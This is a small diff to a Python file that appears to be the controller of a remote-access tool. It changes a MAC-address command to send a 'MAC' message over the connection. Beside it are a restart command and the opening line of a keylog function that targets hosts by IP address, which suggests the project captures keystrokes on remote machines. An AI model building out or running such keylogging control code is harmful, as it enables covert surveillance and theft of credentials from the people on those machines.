@@ -80,7 +80,10 @@ def restart(ip_address):
     action_dictionary[ip_address].put(action_message)
 
 def mac_address(ip_address):
-    action_message = lambda conn: mac_address_server.mac_address(conn)
+    action_message = lambda conn: (
+        conn.sendall(bytes("MAC", "utf8")),
+        mac_address_server.mac_address(conn)
+    )
     action_dictionary[ip_address].put(action_message)
 
 def keylog(ip_address, time):
